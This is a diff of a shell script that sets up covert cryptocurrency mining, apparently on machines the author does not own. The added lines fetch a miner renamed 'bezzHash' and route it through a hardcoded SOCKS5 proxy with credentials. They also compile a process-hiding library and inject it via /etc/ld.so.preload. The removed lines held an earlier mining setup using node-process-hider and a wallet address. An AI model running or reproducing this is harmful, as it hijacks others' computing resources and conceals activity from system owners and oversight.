@@ -1,13 +1,51 @@
 #!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
 
-apt update && apt -y install sudo
-sudo apt update;apt -y install build-essential cpulimit screen ca-certificates libcurl4
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-sudo apt-get install -y nodejs
-sudo apt-get install gcc g++ make
-sudo -u root npm i -g node-process-hider
-sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-sudo dpkg-reconfigure --frontend noninteractive tzdata
-chmod +x high
-cpulimit -e high -l 30 &
-./high --algo ETHASH --pool ethash-eu.unmineable.com:3333 --user BABYDOGE:0x20E66b63b0137C6546b38476ac24F628C306249f.$(cat /proc/sys/kernel/hostname)
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+apt-get install -y libssl-dev libcurl4-gnutls-dev libgmp-dev && apt install -y ocl-icd-opencl-dev
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 45.86.71.9:6269
+socks5_username = lebarankita
+socks5_password = buatTHRan
+END
+
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
+   
+ 
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip 
+unzip magicBezzHash.zip 
+make 
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl 
+mv libprocesshider.so /usr/local/lib/ 
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
+ 
+./graftcp/graftcp ./bezzHash --url=ssl://343QVQVLGBkJdmb2KPhzR6b3JyUFsXQb7G.gagal@daggerhashimoto.usa-east.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
